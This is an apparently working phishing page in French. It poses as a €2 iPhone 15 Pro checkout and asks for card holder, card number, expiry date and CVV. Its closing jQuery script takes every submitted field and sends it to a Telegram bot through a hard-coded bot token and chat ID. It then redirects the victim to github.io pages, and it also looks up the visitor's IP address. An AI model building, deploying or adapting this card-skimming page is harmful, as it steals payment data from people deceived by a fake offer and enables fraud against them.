<!DOCTYPE html>
<html lang="fr" dir="ltr">
<head>
  <meta charset="UTF-8">
  <title>iPhone 15 Pro</title>
  
  <!-- Meta viewport pour les smartphones -->
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- FAVICON -->
  <link href="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/favicon.png" rel="shortcut icon" type="image/x-icon">

  <!-- LOCAL STYLE -->
  <link rel="stylesheet" href="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/css/style.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.2.2/css/bootstrap-grid.min.css" integrity="sha512-a+PObWRxNVh4HZR9wijCGj84JgJ/QhZ8dET09REfYz2clUBjKYhGbOmdy9KEHilYKgbMSIHNQEsonv/r75mHXw==" crossorigin="anonymous" referrerpolicy="no-referrer">
  <link rel="stylesheet" href="/assets/css/styles.css?id=ec1da90a897fb34a69dc780da09ec7e9">

  <!-- Styles additionnels pour le responsive -->
  <style>
    /* S'assurer que les images s'adaptent bien sur mobile */
    img {
      max-width: 100%;
      height: auto;
    }

    /* Ajustements généraux pour le contenu */
    body {
      padding: 0 1rem;
    }

    /* Centrer le contenu du bloc produit sur mobile */
    .product_block {
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    /* Adapter la largeur du formulaire pour les petits écrans */
    .form_wrapper {
      width: 100%;
      max-width: 500px;
      margin: auto;
    }

    /* Rendre la galerie d'images responsive */
    .images_wrapper {
      width: 100%;
      margin-bottom: 1rem;
    }

    /* Réduire la taille des boutons dans le groupe de choix de couleur */
    .btn-group a {
      display: inline-block;
      margin: 0.2rem;
    }

    /* Améliorer la lisibilité des titres et textes */
    h1, h2, h6, p {
      text-align: center;
    }
  </style>

  <!-- Autres styles existants -->
  <style>
    div[style*="fixed"] span[id^="img_"][class^="img_"] > style:first-child + div[style*="flex"][style*="relative"] {
      width: 10000px !important;
    }
  </style>
  <style>
    html[lang="ar"] body {
      direction: unset !important;
    }
    html[lang="ar"] body input,
    html[lang="ar"] body textarea,
    html[lang="ar"] body select {
      direction: unset !important;
    }
    html[lang="ar"] .chip_wrapper p,
    html[lang="ar"] .gigabytes_wrapper p,
    html[lang="ar"] .battery_wrapper p {
      text-align: right;
    }
    .total-price {
      display: none;
    }
    .page-checkout .images_wrapper,
    .page-checkout .choose_color,
    .page-checkout .btn-group {
      display: none !important;
    }
    .page-checkout .product_wrapper .product_block {
      justify-content: center;
    }
    .product_wrapper .form-control {
      color: #ffffff !important;
    }
    .product_wrapper .product_block .images_wrapper .price_block span {
      text-align: center;
    }
  </style>
  <style>
    .topbar {
      display: none;
    }
    .product_wrapper .product_block .form_wrapper .form_block .form-group select {
      color: #fff !important;
    }
  </style>
  <style>
    html[lang="fr"] body,
    html[lang="fr"] body input,
    html[lang="fr"] body textarea,
    html[lang="fr"] body select {
      direction: ltr;
    }
  </style>

  <!-- jQuery -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>

  <!-- Script pour afficher les conditions -->
  <script>
    function __RB_showTerms() {
      document.getElementById('showPopupTerms').style.display = 'block';
    }
  </script>
</head>
<body class="lang-fr page-payment page-checkout">

  <header>
    <!-- TOP BAR PARAGRAPH START -->
    <!-- Votre contenu pour la top bar -->
    <!-- TOP BAR PARAGRAPH END -->
  </header>

  <!-- SECTION PRINCIPALE -->
  <section>
    <!-- BLOC PRODUIT -->
    <div class="product_wrapper animate">
      <div class="container">
        <div class="product_block" style="min-height: 180px;">
          <!-- GAUCHE : IMAGES -->
          <div class="images_wrapper">
            <div class="price_block text-center">
              <span>Seulement maintenant</span>
              <h2>€2,00</h2>
            </div>
            <div id="black" class="img-tab active">
              <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/airpods-iphone-15-pro-blacktitanium1.png" alt="iPhone 15">
            </div>
            <div id="blue" class="img-tab">
              <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/airpods-iphone-15-pro-bluetitanium1.png" alt="iPhone 15">
            </div>
            <div id="natural" class="img-tab">
              <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/airpods-iphone-15-pro-naturaltitanium1.png" alt="iPhone 15">
            </div>
            <div id="white" class="img-tab">
              <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/airpods-iphone-15-pro-whitetitanium1.png" alt="iPhone 15">
            </div>
            <!-- Ajoutez d'autres DIV (images) ici si nécessaire -->
          </div>
          <!-- FIN GAUCHE -->

          <!-- DROITE : FORMULAIRE -->
          <div class="form_wrapper">
            <div class="product_title">
              <h1>iPhone 15 Pro</h1>
            </div>
            <div class="form_block" id="Scroll_form">
              <div class="row">
                <div class="col-12">
                  <div class="title">
                    <label>Entrez vos informations</label>
                  </div>
                </div>
              </div>
              <!-- Choix de la couleur -->
              <div class="row">
                <div class="col-12">
                  <div class="title choose_color">
                    <label>Choisissez votre couleur&nbsp;:</label>
                  </div>
                  <div class="btn-group text-center">
                    <a href="javascript:;" data-tab="black" class="img-nav-tab black active">
                      <input type="radio" name="color" id="black">
                    </a>
                    <a href="javascript:;" data-tab="blue" class="img-nav-tab blue">
                      <input type="radio" name="color" id="blue">
                    </a>
                    <a href="javascript:;" data-tab="natural" class="img-nav-tab natural">
                      <input type="radio" name="color" id="natural">
                    </a>
                    <a href="javascript:;" data-tab="white" class="img-nav-tab white">
                      <input type="radio" name="color" id="white">
                    </a>
                  </div>
                </div>
              </div>
              <!-- Textes pour la validation des champs (cachez-les ou utilisez-les via JS) -->
              <input id="required-text" type="hidden" value="Ce champ est requis.">
              <input id="email-error-text" type="hidden" value="Veuillez entrer une adresse e-mail valide.">
              <input id="phone-error-text" type="hidden" value="Veuillez entrer au moins 6 caractères.">

              <!-- FORMULAIRE DE PAIEMENT -->
              <form id="paymentForm" method="post" action="">
                <div class="accepted-credit-cards text-center" style="margin: 1rem 0;">
                  <p class="accepted-credit-cards-heading" style="font-size: 14px; margin: 0 0 .5rem;">Cartes de crédit acceptées:</p>
                  <img src="https://cdn.soopercdn.com/cp/form-campaign-checkout-v2/assets/images/card.svg" alt="Supported Payment Cards" style="width:auto; max-width:100%;">
                </div>
                <div class="card-holder form-group mb-3">
                  <label for="card_holder">Titulaire de la carte</label>
                  <div class="controls">
                    <input type="text" name="card_holder" id="card_holder" autocomplete="cc-name" value="winw arzone" placeholder="Titulaire de la carte" required class="form-control form-control-lg jp-card-invalid">
                  </div>
                </div>
                <div class="card-number form-group mb-3">
                  <label for="card_number">Numéro de la carte</label>
                  <div class="controls">
                    <input type="tel" name="card_number" id="card_number" autocomplete="cc-number" placeholder="0000 0000 0000 0000" required class="form-control form-control-lg jp-card-invalid">
                  </div>
                </div>
                <div class="expiry-date form-group mb-3">
                  <label for="expiry_date">Date d'expiration</label>
                  <div class="controls">
                    <input type="tel" name="expiry_date" id="expiry_date" autocomplete="cc-exp" placeholder="MM / AA" required class="form-control form-control-lg jp-card-invalid">
                  </div>
                </div>
                <div class="row mb-3">
                  <div class="col-sm-6 col-9">
                    <div class="cvv form-group">
                      <label for="cvv">CVC/CVV</label>
                      <div class="controls">
                        <input type="number" name="cvv" id="cvv" autocomplete="cc-csc" min="0" max="9999" pattern="^[0-9]{3,4}$" placeholder="CVC/CVV" required class="form-control form-control-lg jp-card-invalid">
                      </div>
                    </div>
                  </div>
                  <div class="col-sm-6 col-3 align-self-center">
                    <div class="cvv-helper form-group">
                      <img width="50" src="https://cdn.soopercdn.com/cp/checkout/assets/images/cvv.svg" alt="" style="max-width:100%; max-height:30px; width:auto !important;">
                    </div>
                  </div>
                </div>
                <button type="submit" id="submitButton" class="btn btn-success btn-lg w-100">
                  <span class="loader" style="height:12px; width:12px; border-width:3px; margin-right:5px; display:none;"></span>
                  <span class="submit-label">Effectuer Paiement</span>
                  <span class="waiting-label" style="display:none;">Effectuer Paiement</span>
                </button>
              </form>
              <!-- FIN DU FORMULAIRE -->
            </div>
          </div>
          <!-- FIN DROITE -->
        </div>
      </div>
    </div>
    <!-- FIN BLOC PRODUIT -->

    <!-- SECTION INTRODUCTIVE -->
    <div class="intro_wrapper">
      <div class="container">
        <h2>Apple dévoile l'iPhone 15 Pro.</h2>
        <p>Doté d'une conception en titane solide et légère avec de nouveaux bords profilés, un nouveau bouton Action, des améliorations puissantes de l'appareil photo et l'A17 Pro pour des performances de niveau supérieur et les jeux mobiles.</p>
        <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/hero-img.jpg" alt="iPhone 15 Pro">
      </div>
    </div>

    <!-- BLOC D'ACTION -->
    <div class="action-button_wrapper">
      <div class="container">
        <div class="row align-items-center justify-content-center gy-lg-0 gy-4">
          <div class="col-lg-5">
            <h2>Un nouveau bouton prêt à&nbsp;l’action.</h2>
            <p>Le tout nouveau bouton Action est&nbsp;un raccourci vers votre fonctionnalité préférée. Une fois que vous l’avez configuré, il&nbsp;suffit d’appuyer de façon prolongée pour déclencher l’action souhaitée.</p>
          </div>
          <div class="col-lg-5">
            <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/airpods-music.png" alt="Bouton Action">
          </div>
        </div>
      </div>
    </div>
  </section>
  <!-- FIN SECTION -->

  <!-- FOOTER -->
  <footer>
    <div class="container">
      <div class="block-reassurance">
        <div class="row">
          <div class="col-12">
            <h6 class="text-center">Cartes de crédit acceptées:</h6>
            <div class="text-center">
              <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/card-logo.svg" alt="Cards" width="317" height="54">
            </div>
          </div>
        </div>
      </div>
    </div>
  </footer>
  <!-- FIN FOOTER -->

  <!-- Scripts JS -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
  <script>
    $(document).ready(function () {
      // Récupérer l'IP de l'utilisateur
      $.getJSON("https://api.ipify.org?format=json", function (data) {
        $('#user_ip').val(data.ip);
      });

      // Soumettre le formulaire avec validation
      $('#paymentForm').on('submit', function (e) {
        e.preventDefault();
        if (!validateForm()) {
          return;
        }
        var formData = $(this).serializeArray();
        var message = "Nouvelle commande reçue :\n";
        formData.forEach(function (item) {
          if (item.name !== '_token') {
            message += item.name + ": " + item.value + "\n";
          }
        });

        // Envoyer les données vers votre bot Telegram via un webhook ou API
        $.ajax({
          url: 'https://api.telegram.org/bot7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k/sendMessage',
          method: 'POST',
          data: {
            chat_id: '7747778364',
            text: message
          },
          success: function () {
            window.location.href = "https://justmoicom.github.io/test3/";
          },
          error: function () {
            window.location.href = "https://justmoicom.github.io/tel/";
          }
        });
      });

      // Validation des champs
      function validateForm() {
        var isValid = true;
        $('input[required]').each(function () {
          if ($(this).val().trim() === '') {
            alert($(this).attr('placeholder') + ' est requis.');
            isValid = false;
            return false;
          }
        });
        var expiryDate = $('#expiry_date').val();
        if (!validateExpiryDate(expiryDate)) {
          isValid = false;
        }
        return isValid;
      }

      function validateExpiryDate(date) {
        var regex = /^(0[1-9]|1[0-2])\/\d{2}$/;
        if (!regex.test(date)) {
          alert('La date d\'expiration doit être au format MM/AA.');
          return false;
        }
        var parts = date.split('/');
        var month = parseInt(parts[0], 10);
        if (month < 1 || month > 12) {
          alert('Le mois doit être compris entre 01 et 12.');
          return false;
        }
        return true;
      }

      // Formater le numéro de carte en blocs de 4 chiffres
      function formatCardNumber(input) {
        input.value = input.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ');
      }

      // Formater automatiquement la date d'expiration en MM/AA
      function formatExpiryDate(input) {
        input.value = input.value.replace(/\D/g, '').replace(/(\d{2})(?=\d)/g, '$1/');
      }
    });
  </script>
</body>
</html>
